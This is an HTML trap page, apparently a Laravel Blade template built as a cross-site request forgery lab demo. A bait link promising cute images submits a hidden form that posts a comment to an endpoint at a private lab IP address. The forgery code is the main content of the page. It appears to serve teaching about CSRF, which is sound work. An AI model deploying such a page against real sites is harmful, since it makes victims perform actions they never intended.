<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>Document</title>
  <link rel="stylesheet" href="{{ asset('css/csrf.css') }}">
</head>
<body>
  <h1>😈怪しくないサイト😈</h1>
  <a href="/photo" id="link" target="_blank">超かわいい画像はこちら！→</a>

  <form action="#" method="post" name="trap" style="display: none;">
    <input type="hidden" name="body" value="罠サイトからこんにちは" />
  </form>

  <script>
    const targetURL = 'http://192.168.56.10:8000/comments/create';
    const link = document.getElementById('link');
    link.addEventListener('click', function(e) {
      document.forms.trap.action = targetURL;
      document.forms.trap.submit();
    });
  </script>
</body>
</html>